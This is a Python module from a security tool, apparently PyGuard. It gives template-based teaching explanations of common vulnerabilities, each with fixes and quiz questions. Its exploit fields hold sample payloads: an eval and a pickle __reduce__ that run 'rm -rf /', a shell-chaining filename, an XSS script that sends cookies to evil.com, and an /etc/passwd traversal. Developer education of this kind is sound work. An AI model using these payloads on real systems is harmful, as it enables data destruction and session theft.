"""
AI-Powered Fix Explanation and Educational Mode for PyGuard.

Provides natural language explanations for vulnerabilities, security concepts,
and educational content to help developers learn secure coding practices.

This module uses rule-based templates (no external AI dependencies) to generate
clear, actionable explanations for security issues.

References:
- OWASP Education | https://owasp.org/www-project-top-ten/ | High | Security education
- CWE Education | https://cwe.mitre.org/ | High | Vulnerability education
"""

from dataclasses import dataclass
from typing import Any, ClassVar

from pyguard.lib.core import PyGuardLogger


@dataclass
class SecurityExplanation:
    """Detailed explanation of a security issue."""

    vulnerability_name: str  # Name of the vulnerability
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str  # What is this vulnerability?
    why_dangerous: str  # Why is it dangerous?
    how_to_exploit: str  # How can it be exploited?
    how_to_fix: str  # How to fix it
    example_vulnerable: str  # Example of vulnerable code
    example_secure: str  # Example of secure code
    references: list[str]  # Links for more information
    cwe_id: str | None = None
    owasp_id: str | None = None
    difficulty_level: str = "intermediate"  # beginner, intermediate, advanced


@dataclass
class FixRationale:
    """Explains why a specific fix was chosen."""

    original_code: str  # Original vulnerable code
    fixed_code: str  # Fixed code
    fix_type: str  # Type of fix (replacement, refactor, etc.)
    why_this_fix: str  # Why this specific fix
    alternatives: list[str]  # Alternative fixes
    trade_offs: str  # Trade-offs of this fix
    security_impact: str  # Security improvement
    performance_impact: str  # Performance considerations


class AIExplainer:
    """
    Provides AI-powered explanations for security vulnerabilities.

    Uses rule-based templates to generate natural language explanations
    that help developers understand and learn from security issues.
    """

    # Comprehensive explanation templates
    EXPLANATIONS: ClassVar[dict[str, SecurityExplanation]] = {
        "SQL_INJECTION": SecurityExplanation(
            vulnerability_name="SQL Injection",
            severity="CRITICAL",
            description=(
                "SQL Injection occurs when user input is directly incorporated into "
                "SQL queries without proper sanitization or parameterization. This allows "
                "attackers to manipulate the query structure and execute arbitrary SQL commands."
            ),
            why_dangerous=(
                "Attackers can read sensitive data, modify or delete data, bypass authentication, "
                "and potentially execute commands on the database server. This can lead to "
                "complete database compromise and data breaches."
            ),
            how_to_exploit=(
                "An attacker provides malicious input like: ' OR '1'='1' -- \n"
                "This transforms the query: SELECT * FROM users WHERE id = '' OR '1'='1' -- '\n"
                "which returns all users instead of a specific one."
            ),
            how_to_fix=(
                "1. Use parameterized queries (prepared statements)\n"
                "2. Use ORM frameworks (SQLAlchemy, Django ORM)\n"
                "3. Input validation and sanitization\n"
                "4. Principle of least privilege for database accounts"
            ),
            example_vulnerable=(
                "# VULNERABLE\n"
                "user_id = request.GET['id']\n"
                "query = f\"SELECT * FROM users WHERE id = '{user_id}'\"\n"
                "cursor.execute(query)"
            ),
            example_secure=(
                "# SECURE\n"
                "user_id = request.GET['id']\n"
                'query = "SELECT * FROM users WHERE id = %s"\n'
                "cursor.execute(query, (user_id,))"
            ),
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
            cwe_id="CWE-89",
            owasp_id="A03:2021",
            difficulty_level="intermediate",
        ),
        "COMMAND_INJECTION": SecurityExplanation(
            vulnerability_name="Command Injection",
            severity="CRITICAL",
            description=(
                "Command Injection occurs when an application passes unsafe user-supplied "
                "data to a system shell. Attackers can execute arbitrary operating system "
                "commands on the server."
            ),
            why_dangerous=(
                "Attackers can execute any command the application has permissions for, "
                "including reading sensitive files, modifying system configuration, "
                "installing malware, or using the server for further attacks."
            ),
            how_to_exploit=(
                "An attacker provides input like: file.txt; rm -rf /\n"
                "This transforms the command: cat file.txt; rm -rf /\n"
                "executing both commands where the second deletes everything."
            ),
            how_to_fix=(
                "1. Avoid calling system commands if possible\n"
                "2. Use subprocess with shell=False and argument lists\n"
                "3. Validate and sanitize all inputs\n"
                "4. Use safe APIs instead of shell commands\n"
                "5. Run with minimal privileges"
            ),
            example_vulnerable=(
                "# VULNERABLE\nfilename = request.GET['file']\nos.system(f'cat {filename}')"  # SECURITY: Use subprocess.run() instead
            ),
            example_secure=(
                "# SECURE\n"
                "import subprocess\n"
                "filename = request.GET['file']\n"
                "subprocess.run(['cat', filename], shell=False, check=True)"
            ),
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/78.html",
            ],
            cwe_id="CWE-78",
            owasp_id="A03:2021",
            difficulty_level="intermediate",
        ),
        "CODE_INJECTION": SecurityExplanation(
            vulnerability_name="Code Injection",
            severity="CRITICAL",
            description=(
                "Code Injection occurs when untrusted data is passed to eval(), exec(), "  # DANGEROUS: Avoid eval with untrusted input
                "or compile() functions. This allows attackers to execute arbitrary Python "  # DANGEROUS: Avoid compile with untrusted input
                "code in the application's context."
            ),
            why_dangerous=(
                "Attackers gain complete control over the application, can access all data, "
                "modify application behavior, steal credentials, and potentially compromise "
                "the entire server."
            ),
            how_to_exploit=(
                "An attacker provides: __import__('os').system('rm -rf /')\n"
                "When passed to eval(), this imports os and executes system commands."  # DANGEROUS: Avoid eval with untrusted input
            ),
            how_to_fix=(
                "1. Never use eval(), exec(), or compile() with user input\n"  # DANGEROUS: Avoid eval with untrusted input
                "2. Use ast.literal_eval() for safe literal evaluation\n"  # DANGEROUS: Avoid eval with untrusted input
                "3. Design application to not require dynamic code execution\n"
                "4. If unavoidable, use sandboxed environments"
            ),
            example_vulnerable=(
                "# VULNERABLE\nuser_code = request.GET['code']\nresult = eval(user_code)"  # DANGEROUS: Avoid eval with untrusted input
            ),
            example_secure=(
                "# SECURE\n"
                "import ast\n"
                "user_literal = request.GET['data']\n"
                "result = ast.literal_eval(user_literal)  # Only evaluates literals"  # DANGEROUS: Avoid eval with untrusted input
            ),
            references=[
                "https://owasp.org/www-community/attacks/Code_Injection",
                "https://cwe.mitre.org/data/definitions/95.html",
            ],
            cwe_id="CWE-95",
            owasp_id="A03:2021",
            difficulty_level="intermediate",
        ),
        "HARDCODED_SECRET": SecurityExplanation(
            vulnerability_name="Hardcoded Secrets",
            severity="HIGH",
            description=(
                "Hardcoded secrets are credentials, API keys, or passwords embedded directly "
                "in source code. These can be discovered through code repositories, compiled "
                "binaries, or source code leaks."
            ),
            why_dangerous=(
                "Anyone with access to the code (including via leaked repositories) can use "
                "the credentials to access protected resources, impersonate the application, "
                "and access sensitive data. Secrets in code are difficult to rotate."
            ),
            how_to_exploit=(
                "1. Search GitHub/GitLab for exposed repositories\n"
                "2. Use tools like TruffleHog or GitLeaks\n"
                "3. Decompile binaries to extract strings\n"
                "4. Use discovered credentials to access systems"
            ),
            how_to_fix=(
                "1. Use environment variables for secrets\n"
                "2. Use secret management systems (AWS Secrets Manager, HashiCorp Vault)\n"
                "3. Use configuration files excluded from version control\n"
                "4. Rotate any exposed credentials immediately"
            ),
            example_vulnerable=(
                "# VULNERABLE\nAPI_KEY = 'sk-1234567890abcdef'\npassword = 'SuperSecret123'  # SECURITY: Use environment variables or config files"
            ),
            example_secure=(
                "# SECURE\n"
                "import os\n"
                "API_KEY = os.environ['API_KEY']\n"
                "password = os.environ['PASSWORD']"
            ),
            references=[
                "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password",
                "https://cwe.mitre.org/data/definitions/798.html",
            ],
            cwe_id="CWE-798",
            owasp_id="A07:2021",
            difficulty_level="beginner",
        ),
        "UNSAFE_DESERIALIZATION": SecurityExplanation(
            vulnerability_name="Unsafe Deserialization",
            severity="HIGH",
            description=(
                "Unsafe deserialization occurs when untrusted data is deserialized using "
                "pickle, YAML, or other formats that can execute code during deserialization. "
                "Python's pickle can execute arbitrary code when loading data."
            ),
            why_dangerous=(
                "Attackers can craft malicious serialized objects that execute code when "
                "deserialized, leading to remote code execution, data theft, or system "
                "compromise. This is especially dangerous with pickle.load()."  # SECURITY: Don't use pickle with untrusted data
            ),
            how_to_exploit=(
                "Create a malicious pickle that runs code when loaded:\n"
                "class Exploit:\n"
                "    def __reduce__(self):\n"
                "        return (os.system, ('rm -rf /',))"
            ),
            how_to_fix=(
                "1. Use safe serialization formats (JSON, MessagePack)\n"
                "2. Only deserialize from trusted sources\n"
                "3. Use digital signatures to verify data integrity\n"
                "4. Implement allowlists for allowed classes\n"
                "5. Use yaml.safe_load() instead of yaml.load()"
            ),
            example_vulnerable=(
                "# VULNERABLE\n"
                "import pickle\n"
                "with open('data.pkl', 'rb') as f:\n"
                "    data = pickle.load(f)  # Can execute code!"  # SECURITY: Don't use pickle with untrusted data
            ),
            example_secure=(
                "# SECURE\n"
                "import json\n"
                "with open('data.json', 'r') as f:\n"
                "    data = json.load(f)  # Safe"
            ),
            references=[
                "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
                "https://cwe.mitre.org/data/definitions/502.html",
            ],
            cwe_id="CWE-502",
            owasp_id="A08:2021",
            difficulty_level="advanced",
        ),
        "XSS": SecurityExplanation(
            vulnerability_name="Cross-Site Scripting (XSS)",
            severity="HIGH",
            description=(
                "XSS occurs when an application includes untrusted data in a web page without "
                "proper validation or escaping. Attackers can inject malicious scripts that "
                "execute in victims' browsers."
            ),
            why_dangerous=(
                "Attackers can steal session cookies, perform actions as the victim, "
                "redirect users to malicious sites, modify page content, or steal sensitive "
                "information entered by users."
            ),
            how_to_exploit=(
                "Inject: <script>document.location='http://evil.com?cookie='+document.cookie</script>\n"
                "This steals the victim's session cookie when the page loads."
            ),
            how_to_fix=(
                "1. Escape all user input before rendering in HTML\n"
                "2. Use templating engines with auto-escaping\n"
                "3. Set Content-Security-Policy headers\n"
                "4. Validate and sanitize input\n"
                "5. Use HttpOnly cookies"
            ),
            example_vulnerable=(
                "# VULNERABLE\nusername = request.GET['name']\nreturn f'<h1>Hello {username}</h1>'"
            ),
            example_secure=(
                "# SECURE (Flask)\n"
                "from flask import escape\n"
                "username = request.args.get('name', '')\n"
                "return f'<h1>Hello {escape(username)}</h1>'"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            cwe_id="CWE-79",
            owasp_id="A03:2021",
            difficulty_level="intermediate",
        ),
        "PATH_TRAVERSAL": SecurityExplanation(
            vulnerability_name="Path Traversal",
            severity="HIGH",
            description=(
                "Path Traversal occurs when an application uses user input to construct file "
                "paths without proper validation. Attackers can access files outside the "
                "intended directory using sequences like '../'."
            ),
            why_dangerous=(
                "Attackers can read sensitive files (passwords, configuration, source code), "
                "overwrite critical files, or access system files. Can lead to complete "
                "system compromise."
            ),
            how_to_exploit=(
                "Request: /download?file=../../../../etc/passwd\n"
                "This accesses the system password file instead of intended files."
            ),
            how_to_fix=(
                "1. Never use user input directly in file paths\n"
                "2. Use allowlists for allowed files\n"
                "3. Canonicalize paths and check they're in allowed directory\n"
                "4. Use Path.resolve() and validate against base directory"
            ),
            example_vulnerable=(
                "# VULNERABLE\n"
                "filename = request.GET['file']\n"
                "with open(f'/data/{filename}', 'r') as f:\n"
                "    return f.read()"
            ),
            example_secure=(
                "# SECURE\n"
                "from pathlib import Path\n"
                "filename = request.GET['file']\n"
                "base = Path('/data').resolve()\n"
                "filepath = (base / filename).resolve()\n"
                "if not str(filepath).startswith(str(base)):\n"
                "    raise ValueError('Invalid path')\n"
                "with open(filepath, 'r') as f:\n"
                "    return f.read()"
            ),
            references=[
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
            ],
            cwe_id="CWE-22",
            owasp_id="A01:2021",
            difficulty_level="intermediate",
        ),
    }

    def __init__(self):
        """Initialize the AI explainer."""
        self.logger = PyGuardLogger()

    def explain_vulnerability(
        # TODO: Add docstring
        self, vulnerability_type: str, educational_level: str = "intermediate"
    ) -> SecurityExplanation | None:
        """
        Get detailed explanation of a vulnerability type.

        Args:
            vulnerability_type: Type of vulnerability (e.g., "SQL_INJECTION")
            educational_level: Level of detail (beginner, intermediate, advanced)

        Returns:
            SecurityExplanation object or None if not found
        """
        explanation = self.EXPLANATIONS.get(vulnerability_type.upper())

        if explanation and educational_level != explanation.difficulty_level:
            # Adjust explanation complexity based on level
            return self._adjust_explanation_level(explanation, educational_level)

        return explanation

    def explain_fix(
        # TODO: Add docstring
        self,
        original_code: str,
        fixed_code: str,
        vulnerability_type: str,
    ) -> FixRationale:
        """
        Explain why a specific fix was chosen.

        Args:
            original_code: Original vulnerable code
            fixed_code: Fixed secure code
            vulnerability_type: Type of vulnerability

        Returns:
            FixRationale explaining the fix
        """
        # Get base explanation
        explanation = self.explain_vulnerability(vulnerability_type)

        # Generate fix rationale
        return self._generate_fix_rationale(
            original_code, fixed_code, vulnerability_type, explanation
        )

    def _adjust_explanation_level(
        # TODO: Add docstring
        self, explanation: SecurityExplanation, level: str
    ) -> SecurityExplanation:
        """Adjust explanation complexity for different skill levels."""
        if level == "beginner":
            # Simplify technical terms
            return SecurityExplanation(
                vulnerability_name=explanation.vulnerability_name,
                severity=explanation.severity,
                description=self._simplify_text(explanation.description),
                why_dangerous=self._simplify_text(explanation.why_dangerous),
                how_to_exploit="(Technical details omitted for beginners)",
                how_to_fix=explanation.how_to_fix,
                example_vulnerable=explanation.example_vulnerable,
                example_secure=explanation.example_secure,
                references=explanation.references[:1],  # Fewer references
                cwe_id=explanation.cwe_id,
                owasp_id=explanation.owasp_id,
                difficulty_level="beginner",
            )
        if level == "advanced":
            # Add more technical details
            return explanation  # Advanced gets full explanation

        return explanation  # Intermediate is default

    def _simplify_text(self, text: str) -> str:
        """Simplify technical text for beginners."""
        # Replace technical terms with simpler alternatives
        simplifications = {
            "parameterization": "using placeholders",
            "sanitization": "cleaning",
            "exploitation": "attack",
            "arbitrary": "any",
            "compromise": "take over",
        }

        for technical, simple in simplifications.items():
            text = text.replace(technical, simple)

        return text

    def _generate_fix_rationale(
        # TODO: Add docstring
        self,
        original_code: str,
        fixed_code: str,
        vulnerability_type: str,
        _explanation: SecurityExplanation | None,  # Reserved for future use
    ) -> FixRationale:
        """Generate detailed rationale for a fix."""
        fix_templates = {
            "SQL_INJECTION": {
                "why": "Parameterized queries prevent SQL injection by separating SQL logic from data.",
                "alternatives": [
                    "Use ORM framework (SQLAlchemy, Django ORM)",
                    "Validate and sanitize input (less secure)",
                    "Use stored procedures",
                ],
                "trade_offs": "Slightly more code, but dramatically more secure. No performance impact.",
                "security_impact": "Eliminates SQL injection vulnerability completely.",
                "performance_impact": "No performance impact; may be slightly faster due to query caching.",
            },
            "COMMAND_INJECTION": {
                "why": "Using argument lists prevents command injection by avoiding shell interpretation.",
                "alternatives": [
                    "Use Python libraries instead of shell commands",
                    "Input validation and allowlisting",
                    "Containerized execution",
                ],
                "trade_offs": "More explicit but safer. May require code restructuring.",
                "security_impact": "Completely prevents command injection attacks.",
                "performance_impact": "Slightly faster (no shell spawning overhead).",
            },
            "CODE_INJECTION": {
                "why": "ast.literal_eval() only evaluates Python literals, preventing code execution.",  # DANGEROUS: Avoid eval with untrusted input
                "alternatives": [
                    "Use JSON for structured data",
                    "Design to avoid dynamic evaluation",
                    "Sandboxed execution (complex)",
                ],
                "trade_offs": "Limited to literal values only (strings, numbers, lists, dicts, booleans, None).",
                "security_impact": "Eliminates code injection risk entirely.",
                "performance_impact": "Minimal performance impact.",
            },
            "HARDCODED_SECRET": {
                "why": "Environment variables keep secrets out of source code and version control.",
                "alternatives": [
                    "Secret management service (AWS Secrets Manager, Vault)",
                    "Configuration files (excluded from version control)",
                    "Encrypted config files",
                ],
                "trade_offs": "Requires environment setup, but essential for security.",
                "security_impact": "Prevents credential exposure in code repositories.",
                "performance_impact": "No performance impact.",
            },
        }

        template = fix_templates.get(
            vulnerability_type.upper(),
            {
                "why": "This fix follows security best practices.",
                "alternatives": ["Manual code review", "Input validation"],
                "trade_offs": "May require additional code changes.",
                "security_impact": "Improves security posture.",
                "performance_impact": "Minimal impact.",
            },
        )

        return FixRationale(
            original_code=original_code,
            fixed_code=fixed_code,
            fix_type="automated_security_fix",
            why_this_fix=str(template["why"]),
            alternatives=(
                list(template["alternatives"])
                if isinstance(template["alternatives"], list)
                else [str(template["alternatives"])]
            ),
            trade_offs=str(template["trade_offs"]),
            security_impact=str(template["security_impact"]),
            performance_impact=str(template["performance_impact"]),
        )

    def generate_learning_content(self, vulnerability_type: str) -> dict[str, Any]:
        """
        Generate educational content for a vulnerability type.

        Args:
            vulnerability_type: Type of vulnerability

        Returns:
            Dictionary with learning content
        """
        explanation = self.explain_vulnerability(vulnerability_type)

        if not explanation:
            return {}

        return {
            "title": explanation.vulnerability_name,
            "summary": explanation.description,
            "risk_level": explanation.severity,
            "learning_objectives": [
                f"Understand what {explanation.vulnerability_name} is",
                "Recognize vulnerable code patterns",
                "Implement secure alternatives",
                "Test for this vulnerability",
            ],
            "vulnerable_pattern": explanation.example_vulnerable,
            "secure_pattern": explanation.example_secure,
            "quiz_question": self._generate_quiz_question(explanation),
            "further_reading": explanation.references,
        }

    def _generate_quiz_question(self, explanation: SecurityExplanation) -> dict[str, Any]:
        """Generate a quiz question for learning."""
        questions = {
            "SQL Injection": {
                "question": "Which method is the most secure for preventing SQL injection?",
                "options": [
                    "String concatenation with input validation",
                    "Parameterized queries with placeholders",
                    "Escaping special characters manually",
                    "Using f-strings with user input",
                ],
                "correct": 1,
                "explanation": "Parameterized queries (option 2) separate SQL logic from data, making injection impossible.",
            },
            "Command Injection": {
                "question": "Why is subprocess.run(cmd, shell=True) dangerous?",
                "options": [
                    "It's slower than shell=False",
                    "It allows shell metacharacter injection",
                    "It requires more memory",
                    "It's deprecated",
                ],
                "correct": 1,
                "explanation": "shell=True allows shell metacharacters like ; | & to chain commands maliciously.",
            },
        }

        return questions.get(
            explanation.vulnerability_name,
            {
                "question": "How can you prevent this vulnerability?",
                "options": [
                    "Input validation",
                    "Use secure coding practices",
                    "Follow framework recommendations",
                    "All of the above",
                ],
                "correct": 3,
                "explanation": "Multiple defensive layers provide the best security.",
            },
        )


def explain(vulnerability_type: str, level: str = "intermediate") -> SecurityExplanation | None:
    """
    Convenience function to get vulnerability explanation.

    Args:
        vulnerability_type: Type of vulnerability
        level: Educational level (beginner, intermediate, advanced)

    Returns:
        SecurityExplanation object or None
    """
    explainer = AIExplainer()
    return explainer.explain_vulnerability(vulnerability_type, level)
